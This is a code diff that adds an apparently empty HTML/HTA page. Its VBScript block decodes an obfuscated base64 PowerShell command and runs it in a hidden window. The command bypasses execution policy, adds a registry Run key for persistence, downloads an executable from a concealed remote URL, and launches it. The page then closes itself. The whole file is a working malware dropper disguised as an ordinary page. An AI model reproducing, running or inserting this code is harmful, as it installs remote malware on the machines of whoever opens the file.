@@ -1,0 +1,86 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+<script language="VBScript">
+    Function kSTbhnhBRPsjCI(WGZsSVW)
+        Dim MiwGsFgrgNeWF
+        Dim RmRlVI
+        Dim xvnQcnmST
+        Dim IZcwkzKovf
+        Dim ZWVUioCQCEF
+        Dim bdLtuRTstfCK
+        Dim RHvQVf
+        Dim pDImXWkWlGIOMiX
+        Dim ELYZuORYtVMxwme
+        Dim wqxrcciXDOJ
+        Dim mtnKrwa
+        Dim LPXHKkrsM
+        Dim UggOzXSkfN
+        Dim EbLfkdWFhCIHao
+            
+        WGZsSVW = Replace(WGZsSVW, vbCrLf, "")
+        WGZsSVW = Replace(WGZsSVW, vbTab, "")
+        WGZsSVW = Replace(WGZsSVW, " ", "")
+        RmRlVI = Len(WGZsSVW)
+        MiwGsFgrgNeWF = "ABCDEFGHIJKLMNOP"
+        MiwGsFgrgNeWF = MiwGsFgrgNeWF + "QRSTUVWXYZabcdef"
+        MiwGsFgrgNeWF = MiwGsFgrgNeWF + "ghijklmnopqrstuv"
+        MiwGsFgrgNeWF = MiwGsFgrgNeWF + "wxyz0123456789+/"
+
+        For IZcwkzKovf = 1 To RmRlVI Step 4
+            Dim XTMYQQbcqkNRpIT
+            Dim nmYYCTHnG
+            Dim gLdCGCjP
+            Dim tqoSiEc
+            Dim qHsgobZBptjPDzV
+            Dim JGhPP
+            Dim OrGccIAELlpH
+            Dim UNwHrihbfVkN
+            Dim NcFhTRnZTp
+            Dim iHxdepZXEOCFIU
+            Dim bgAwoGb
+
+            XTMYQQbcqkNRpIT = 3
+            qHsgobZBptjPDzV = 0
+
+            For nmYYCTHnG = 0 To 3
+                gLdCGCjP = Mid(WGZsSVW, IZcwkzKovf + nmYYCTHnG, 1)
+
+                If gLdCGCjP = "=" Then
+                    XTMYQQbcqkNRpIT = XTMYQQbcqkNRpIT - 1
+                    tqoSiEc = 0
+                Else
+                    tqoSiEc = InStr(1, MiwGsFgrgNeWF, gLdCGCjP, vbBinaryCompare) - 1
+                End If
+
+                qHsgobZBptjPDzV = 64 * qHsgobZBptjPDzV + tqoSiEc
+            Next
+              
+            qHsgobZBptjPDzV = Hex(qHsgobZBptjPDzV)
+            qHsgobZBptjPDzV = String(6 - Len(qHsgobZBptjPDzV), "0") & qHsgobZBptjPDzV
+              
+            JGhPP = Chr(CByte("&H" & Mid(qHsgobZBptjPDzV, 1, 2))) + _
+                Chr(CByte("&H" & Mid(qHsgobZBptjPDzV, 3, 2))) + _
+                Chr(CByte("&H" & Mid(qHsgobZBptjPDzV, 5, 2)))
+
+            xvnQcnmST = xvnQcnmST & Left(JGhPP, XTMYQQbcqkNRpIT)
+        Next
+
+        kSTbhnhBRPsjCI = xvnQcnmST
+    End Function
+
+    Dim RpCZGnmKRjA
+    Dim gaReBtjRqosO
+    Dim VozIIYgvr
+    RpCZGnmKRjA = "cG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBieXBhc3MgLVdpbmRvdyAxIFt2b2lkXSAkbnVsbDskYm5GWkNzQVBIZFcgPSBHZXQtUmFuZG9tIC1NaW4gMyAtTWF4IDQ7JEF3UXZlaEd5WE94ID0gKFtjaGFyW11dKFtjaGFyXTk3Li5bY2hhcl0xMjIpKTskdU1vTEFxQUggPSAtam9pbiAoJEF3UXZlaEd5WE94IHwgR2V0LVJhbmRvbSAtQ291bnQgJGJuRlpDc0FQSGRXIHwgJSB7W0NoYXJdJF99KTskUUJrWGVES0NZQ0x5ID0gW2NoYXJdMHgyZStbY2hhcl0weDY1K1tjaGFyXTB4NzgrW2NoYXJdMHg2NTskZmhNZWRNID0gJHVNb0xBcUFIICsgJFFCa1hlREtDWUNMeTskZGxPUFJMeD1bY2hhcl0weDUzK1tjaGFyXTB4NjErW2NoYXJdMHg0YzskWGNqS0NReEZla2ZUeEhMPVtjaGFyXTB4NDkrW2NoYXJdMHg0NStbY2hhcl0weDU4OyRaTUl4UHBHblVVUFBSV0U9W2NoYXJdMHg3MytbY2hhcl0weDQxK1tjaGFyXTB4NzArW2NoYXJdMHg1MztzQUwgbGl6eHIgJGRsT1BSTHg7JFZCU3RYPVtjaGFyXTB4NGUrW2NoYXJdMHg2NStbY2hhcl0weDc0K1tjaGFyXTB4MmUrW2NoYXJdMHg1NytbY2hhcl0weDY1K1tjaGFyXTB4NjIrW2NoYXJdMHg0MytbY2hhcl0weDZjK1tjaGFyXTB4NjkrW2NoYXJdMHg2NStbY2hhcl0weDZlK1tjaGFyXTB4NzQ7bGl6eHIgbXFidXhpZ2Nlb3dqbiAkWGNqS0NReEZla2ZUeEhMOyRJVExHdWt5ZmRncT1bY2hhcl0weDI0K1tjaGFyXTB4NjUrW2NoYXJdMHg2ZStbY2hhcl0weDc2K1tjaGFyXTB4M2ErW2NoYXJdMHg1MCtbY2hhcl0weDU1K1tjaGFyXTB4NDIrW2NoYXJdMHg0YytbY2hhcl0weDQ5K1tjaGFyXTB4NDN8bXFidXhpZ2Nlb3dqbjtsaXp4ciBndHN1cnZ5d3ogJFpNSXhQcEduVVVQUFJXRTskaEpvSXVJZElVanpicSA9ICRJVExHdWt5ZmRncSArIFtjaGFyXTB4NWMgKyAkZmhNZWRNOzs7JGx0aUVoTXVvb1lmYT1bY2hhcl0weDQ4K1tjaGFyXTB4NGIrW2NoYXJdMHg2MytbY2hhcl0weDU1K1tjaGFyXTB4M2ErW2NoYXJdMHg1YytbY2hhcl0weDczK1tjaGFyXTB4NmYrW2NoYXJdMHg0NitbY2hhcl0weDc0K1tjaGFyXTB4NTcrW2NoYXJdMHg2MStbY2hhcl0weDcyK1tjaGFyXTB4NDUrW2NoYXJdMHg1YytbY2hhcl0weDZkK1tjaGFyXTB4NjkrW2NoYXJdMHg2MytbY2hhcl0weDUyK1tjaGFyXTB4NmYrW2NoYXJdMHg3MytbY2hhcl0weDZmK1tjaGFyXTB4NjYrW2NoYXJdMHg1NCtbY2hhcl0weDVjK1tjaGFyXTB4NTcrW2NoYXJdMHg2OStbY2hhcl0weDRlK1tjaGFyXTB4NjQrW2NoYXJdMHg0ZitbY2hhcl0weDc3K1tjaGFyXTB4NTMrW2NoYXJdMHg1YytbY2hhcl0weDQzK1tjaGFyXTB4NzUrW2NoYXJdMHg1MitbY2hhcl0weDcyK1tjaGFyXTB4NjUrW2NoYXJdMHg0ZStbY2hhcl0weDU0K1tjaGFyXTB4NzYrW2NoYXJdMHg2NStbY2hhcl0weDUyK1tjaGFyXTB4NzMrW2NoYXJdMHg0OStbY2hhcl0weDRmK1tjaGFyXTB4NmUrW2NoYXJdMHg1YytbY2hhcl0weDcyK1tjaGFyXTB4NzUrW2NoYXJdMHg0ZTtOZXctSXRlbVByb3BlcnR5IC1QYXRoICRsdGlFaE11b29ZZmEgLU5hbWUgJHVNb0xBcUFIIC1WYWx1ZSAkaEpvSXVJZElVanpicSAtRm9yY2U7OyRjaE5LbGdGY3F3ID0gJ2FIUjBjSE02THk4eE1qUTVOVGd5T0RrdE5ETTVNVGN6TmpRMk16WXdOakF3TkRNMkxuQnlaWFpwWlhjdVpXUnBkRzE1YzJsMFpTNWpiMjB2ZFhCc2IyRmtjeTh4THpJdk5DODVMekV5TkRrMU9ESTRPUzl1YW1KeUxtVjRaUT09JzskY2hOS2xnRmNxdz1bU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRjaE5LbGdGY3F3KSk7JFFXVEZyT2Zsd2ZvenBIID0gTmV3LU9iamVjdCAkVkJTdFg7JEp0ZU9TayA9ICRRV1RGck9mbHdmb3pwSC5Eb3dubG9hZERhdGEoJGNoTktsZ0ZjcXcpO1tJTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkaEpvSXVJZElVanpicSwgJEp0ZU9Tayk7Z3RzdXJ2eXd6ICRoSm9JdUlkSVVqemJxOzskTnRrYUZBSk9tV3VLbiA9IEAoJHd1SERLZmhVLCAkc2pSSm1sb1l4YywgJGNma0Jza3IsICRGdWdxbnZSUUtQKTtmb3JlYWNoKCRsdkFKUXJCcCBpbiAkTnRrYUZBSk9tV3VLbil7JG51bGwgPSAkX30iIg=="
+    gaReBtjRqosO = kSTbhnhBRPsjCI(RpCZGnmKRjA)
+    set VozIIYgvr = CreateObject("Wscript.Shell")
+    VozIIYgvr.Run(gaReBtjRqosO),0,true
+    self.close()
+</script>
+</head>
+<div> 
+</div>   
+<body>
+</body>
+</html>
